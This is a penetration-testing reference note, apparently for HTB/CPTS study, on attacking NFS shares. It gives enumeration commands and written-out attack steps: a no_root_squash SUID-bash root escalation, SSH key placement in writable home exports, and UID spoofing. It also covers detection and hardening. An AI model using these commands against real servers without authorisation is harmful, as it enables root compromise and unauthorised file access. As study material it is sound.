# NFS

#NFS #NetworkFileSystem #filetransfer

## What is NFS?

Network File System — access files over the network as if local, ubiquitous on Linux/Unix for shared storage, backups and home directories. The security model is the catch: classic NFS (v2/v3, and v4 with `sec=sys`) uses **AUTH_SYS**, where the *client* asserts its own UID/GID and the server trusts it. So NFS access control is really "do I control a client that can claim the right UID?" — which is why UID spoofing and `no_root_squash` are the whole game on an engagement.

- Port **TCP/UDP 2049** — NFS
- Port **TCP/UDP 111** — rpcbind/portmapper (needed by NFSv2/3; NFSv4 does not use it)
- Exports configured in `/etc/exports`
- NFSv4 is single-port/firewall-friendly and supports Kerberos (`sec=krb5`) — but most real deployments still run `sec=sys` (trust-the-client)

| Version | Notes |
|---|---|
| NFSv2 | Legacy; UDP-only |
| NFSv3 | Variable file sizes, better errors; needs rpcbind |
| NFSv4 | Stateful, ACLs, firewall-friendly, optional Kerberos — **no MOUNT protocol** (so `showmount` may return nothing) |

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | `nfs-showmount`/`nfs-ls`/`nfs-statfs`/`rpcinfo` NSE — list + *read* exports without mounting |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `auxiliary/scanner/nfs/nfsmount` |

Native clients are the `nfs-common` utilities — `showmount`, `mount -t nfs`, `rpcinfo` — used inline below.

---

## Enumeration

```bash
# Nmap NFS scripts — nfs-ls reads file listings/contents without mounting
nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs -sV <target>
nmap -p 111 --script rpcinfo <target>

# showmount — list exported shares (MOUNT protocol; NFSv2/3)
showmount -e <target>

# rpcinfo — list RPC services + ports
rpcinfo -p <target>

# Metasploit
use auxiliary/scanner/nfs/nfsmount
```

> [!warning] **`showmount -e` returns nothing on NFSv4.** v4 dropped the MOUNT protocol, so a v4-only server can have exports and still show an empty `showmount`. Don't conclude "no exports" — **mount the pseudo-root directly** and browse: `sudo mount -t nfs4 <target>:/ /mnt/t -o nolock` then `ls /mnt/t`.

---

## Mount / Access

```bash
sudo mkdir -p /mnt/nfs_target

# NFSv3 export, or the whole root
sudo mount -t nfs <target>:/ /mnt/nfs_target -o nolock
sudo mount -t nfs <target>:/home /mnt/nfs_target -o nolock

# NFSv4 pseudo-root (works when showmount is blank)
sudo mount -t nfs4 <target>:/ /mnt/nfs_target

df -h ; mount | grep nfs        # confirm
sudo umount /mnt/nfs_target
```

---

## Attack Vectors

### Privilege escalation via `no_root_squash`

When a share is exported `no_root_squash`, **root on the client = root on the server** for that share. Drop a SUID-root shell:

```bash
sudo mount -t nfs <target>:/home /mnt/nfs_target -o nolock
sudo cp /bin/bash /mnt/nfs_target/rootbash
sudo chmod +s /mnt/nfs_target/rootbash      # SUID
# then on the target (SSH/existing shell):
/home/rootbash -p                            # -p preserves euid → root
```

### SSH key placement (writable home export)

```bash
sudo mount -t nfs <target>:/home/user /mnt/nfs_target -o nolock
sudo mkdir -p /mnt/nfs_target/.ssh
sudo bash -c 'cat ~/.ssh/id_rsa.pub >> /mnt/nfs_target/.ssh/authorized_keys'
ssh user@<target>
```

### UID/GID spoofing (AUTH_SYS)

The core trust weakness: with `sec=sys`, the server enforces file permissions against the **client-asserted** UID. If a file is owned by UID 1001, become UID 1001 locally and you own it — no server-side auth involved.

```bash
sudo useradd -u 1001 victimuid          # match the target file's owner UID
sudo -u victimuid cat /mnt/nfs_target/secret     # read as UID 1001
```

`root_squash` only remaps UID 0 → `nobody`; every *non-root* UID is still spoofable, so `root_squash` is not much protection against a determined client. Kerberos (`sec=krb5`) is what actually fixes this.

---

## Export Options (`/etc/exports`)

```
# <share_path> <host>(<options>)
/var/nfs/general *(rw,sync,no_subtree_check)
/home            10.0.0.0/24(rw,sync,no_root_squash)
/data            192.168.1.5(ro,sync)
```

| Option | Meaning |
|---|---|
| `rw` / `ro` | Read-write / read-only |
| `no_root_squash` | Client root = server root — **dangerous** |
| `root_squash` | Map UID/GID 0 → anonymous (default; non-root UIDs still trusted) |
| `all_squash` | Map *all* UIDs → anonymous |
| `anonuid=` / `anongid=` | UID/GID the squashed anon maps to |
| `insecure` | Accept client source ports > 1024 (unprivileged clients) |
| `no_subtree_check` | Disable subtree checking (common) |

---

## Detection & Artefacts

- **Mount attempts and `showmount` queries** land in the server's `rpc.mountd`/`rpcbind` logs; a mount from an unexpected client IP is the first tell.
- **The `no_root_squash` privesc leaves a SUID-root binary** in the exported path — a `chmod +s` file owned by root in a user share is the artefact; `find <export> -perm -4000` finds it.
- **UID spoofing is invisible server-side** — the server just sees "UID 1001 read a file it's allowed to." Detection has to be client-attestation (Kerberos) or network ACLs, not logs.
- Defensive baseline: `root_squash`+`all_squash`, `sec=krb5`, host-restricted exports (never `*`), `ro` where possible, and no sensitive data in world-mountable shares.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `no_root_squash` | Root on client = root on server → trivial privesc via SUID |
| `*(rw,...)` wildcard host | Any host can mount and write |
| `insecure` | Clients can use unprivileged (>1024) source ports |
| `sec=sys` (no Kerberos) | UID/GID spoofing — server trusts client-asserted identity |
| Sensitive data in exports | Direct data exposure to any allowed client |

---

## Quick Reference

| Goal | Command |
|---|---|
| List exports (v2/3) | `showmount -e host` |
| Read exports w/o mounting | `nmap -p 111,2049 --script nfs-ls,nfs-showmount host` |
| Mount share | `sudo mount -t nfs host:/share /mnt/t -o nolock` |
| Mount v4 pseudo-root | `sudo mount -t nfs4 host:/ /mnt/t` |
| SUID-bash privesc | `cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash; ./rootbash -p` |
| UID spoof | `useradd -u <uid> x; sudo -u x cat /mnt/file` |
| RPC services | `rpcinfo -p host` |

---

> [!note] **See also** — file-share siblings [[Services/File Xfer/SMB|SMB]] (the Windows equivalent) and [[Services/File Xfer/Rsync|Rsync]]; `no_root_squash`/SUID sits in the wider Linux privesc toolkit ([[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]]).

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
